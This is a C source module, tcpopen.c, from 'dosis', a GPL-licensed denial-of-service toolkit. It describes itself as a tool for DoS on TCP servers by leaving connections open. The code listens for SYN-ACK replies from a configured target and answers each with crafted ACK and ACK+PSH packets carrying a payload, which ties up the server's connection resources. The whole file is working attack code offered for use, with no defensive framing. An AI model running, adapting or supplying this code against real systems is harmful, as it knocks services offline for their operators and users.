/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "log.h"
#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "payload.h"
#include "pthreadex.h"
#include "ip.h"

#define BUFSIZE    2048

#define IPV4_SADDR_P(p,x)  INET_ADDR_IPV4_GETP(p, IPV4_SADDR(x))
#define IPV4_TADDR_P(p,x)  INET_ADDR_IPV4_GETP(p, IPV4_TADDR(x))

typedef struct _tag_TCPOPEN_CFG {
  TEA_TYPE_ADDR  shost;
  TEA_TYPE_ADDR  dhost;
  TEA_TYPE_INT   npackets;
  TEA_TYPE_DATA  payload;
  TEA_TYPE_INT   tcp_mss;
  TEA_TYPE_INT   tcp_win;
  TEA_TYPE_INT   delay;
  TEA_TYPE_BOOL  debug;

  LN_CONTEXT     lnc;
} TCPOPEN_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpopen__listen_check(THREAD_WORK *tw, int proto, char *msg, unsigned int size)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* check proto, msg size and headers */
  if(proto != INET_FAMILY_IPV4
  || !IPV4_TCP_HDRCK(msg, size))
    return 0;

  /* check msg */
  return IPV4_SADDR(msg) == tc->dhost.addr.in.addr
      && IPV4_TCP_SPORT(msg) == tc->dhost.port
         ? -1 : 0;
}

static void tcpopen__send_kakita(TEA_MSG *m, THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *t;

  /* send handshake and data TCP packet */
  if((t = msg_build_ip_tcp_packet(&tc->shost.addr, IPV4_TCP_DPORT(m->b),
                                  &tc->dhost.addr, IPV4_TCP_SPORT(m->b),
                                  /* ip_id */ 0, /* frag_off */ 0,
                                  LN_TH_ACK,
                                  tc->tcp_win,
                                  IPV4_TCP_ACK(m->b),
                                  IPV4_TCP_SEQ(m->b) + 1,
                                  NULL, 0,
                                  NULL, 0)) == NULL)
    TFAT("Cannot build syn packet.");
  if(tc->debug)
  {
    TLOG("Sending >> packet with delay %d milisec:", tc->delay);
    TDUMPMSG(LOG_LEVEL_LOG, t->dest.type, t->b, t->s);
  }
  tea_thread_msg_send(&tc->lnc, t, tc->delay);

  if((t = msg_build_ip_tcp_packet(&tc->shost.addr, IPV4_TCP_DPORT(m->b),
                                  &tc->dhost.addr, IPV4_TCP_SPORT(m->b),
                                  /* ip_id */ 0, /* frag_off */ 0,
                                  LN_TH_ACK | LN_TH_PUSH,
                                  tc->tcp_win,
                                  IPV4_TCP_ACK(m->b),
                                  IPV4_TCP_SEQ(m->b) + 1,
                                  (char *) tc->payload.data, tc->payload.size,
                                  NULL, 0)) == NULL)
    TFAT("Cannot build ack packet.");
  if(tc->debug)
  {
    TLOG("Sending >> packet with delay %d milisec:", tc->delay);
    TDUMPMSG(LOG_LEVEL_LOG, t->dest.type, t->b, t->s);
  }
  tea_thread_msg_send(&tc->lnc, t, tc->delay << 1);
}

static void tcpopen__thread(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *m;

  /* listen the radio */
  while(1)
  {
    /* check for messages */
    m = tea_thread_msg_wait(tw);

    if(IPV4_PROTOCOL(m->b) != 6)
      TFAT("Received << NON-TCP message. Filter func has failed?");

    if(tc->debug)
    {
      TLOG("Received << following packet:");
      TDUMPMSG(LOG_LEVEL_LOG, m->dest.type, m->b, m->s);
    } else
      TDBG2("Received << from %d.%d.%d.%d:%d->%d [%s%s%s%s] => [%08x/%08x] >>",
            IPV4_SADDR_P(3, m->b),
            IPV4_SADDR_P(2, m->b),
            IPV4_SADDR_P(1, m->b),
            IPV4_SADDR_P(0, m->b),
            IPV4_TCP_SPORT(m->b), IPV4_TCP_DPORT(m->b),
            IPV4_TCP_HDR(m->b)->rst ? "R" : "",
            IPV4_TCP_HDR(m->b)->syn ? "S" : "",
            IPV4_TCP_HDR(m->b)->psh ? "P" : "",
            IPV4_TCP_HDR(m->b)->ack ? "A" : "",
            IPV4_SADDR(m->b), tc->shost.addr.in.addr);

    /* in some special case (handshake) send kakitas */
    if(IPV4_TCP_HDR(m->b)->syn != 0
    && IPV4_TCP_HDR(m->b)->ack != 0)
      tcpopen__send_kakita(m, tw);

    /* release msg buffer */
    msg_release(m);
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpopen__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(first_time)
  {
    /* initialize libnet */
    ln_init_context(&tc->lnc);
  }

  /* configure src address (if not defined) */
  if(tc->shost.addr.type == INET_FAMILY_NONE
  && dos_get_source_address(&tc->shost.addr, &tc->dhost.addr))
    return -1;

  /* (debug) print configuration */
  if(tc->debug)
    TLOG("LISTENER debug mode enabled. Packets will be printed.");

  {
    char buff[255];

    TDBG2("config.periodic.bytes  = %d", tc->payload.size);
    ip_addr_snprintf(&tc->shost.addr, tc->shost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.shost   = %s", buff);
    ip_addr_snprintf(&tc->dhost.addr, tc->dhost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost   = %s", buff);
    TDBG2("config.options.payload = %d bytes", tc->payload.size);
  }

  return 0;
}

static void tcpopen__cleanup(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    ln_destroy_context(&tc->lnc);
    if(tc->payload.data)
    {
      free(tc->payload.data);
      tc->payload.data = NULL;
    }
  }
  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TOC_BEGIN(teaTCPOPEN_cfg)
  TOC("debug",    TEA_TYPE_BOOL, 0, TCPOPEN_CFG, debug,   NULL)
  TOC("delay",    TEA_TYPE_INT,  0, TCPOPEN_CFG, delay,   NULL)
  TOC("dst_addr", TEA_TYPE_ADDR, 1, TCPOPEN_CFG, dhost,   NULL)
  TOC("dst_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, dhost,   NULL)
  TOC("payload",  TEA_TYPE_DATA, 1, TCPOPEN_CFG, payload, NULL)
  TOC("src_addr", TEA_TYPE_ADDR, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("src_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("tcp_win",  TEA_TYPE_INT,  1, TCPOPEN_CFG, tcp_win, NULL)
  TOC("tcp_mss",  TEA_TYPE_INT,  0, TCPOPEN_CFG, tcp_mss, NULL)
TOC_END

TEA_OBJECT teaTCPOPEN = {
  .name         = "TCPOPEN",
  .datasize     = sizeof(TCPOPEN_CFG),
  .configure    = tcpopen__configure,
  .cleanup      = tcpopen__cleanup,
  .thread       = tcpopen__thread,
  .listener     = 1,
  .listen_check = tcpopen__listen_check,
  .cparams      = teaTCPOPEN_cfg
};

